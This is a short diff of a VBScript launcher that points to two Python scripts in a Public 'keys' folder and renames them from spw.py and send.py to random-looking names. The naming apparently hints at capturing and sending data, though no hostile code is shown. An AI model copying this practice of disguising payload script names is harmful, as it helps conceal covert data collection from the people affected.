@@ -11,8 +11,8 @@ pythonExe = "C:\Python311\python.exe"
 ' A folder ahol a két py van
 baseDir = "C:\Users\Public\Documents\keys"
 
-spwPath = baseDir & "\spw.py"
-sendPath = baseDir & "\send.py"
+spwPath = baseDir & "\spwww743g7w.py"
+sendPath = baseDir & "\fwsendbfgw.py"
 
 If Not fso.FileExists(pythonExe) Then
     MsgBox "Python exe not found: " & pythonExe
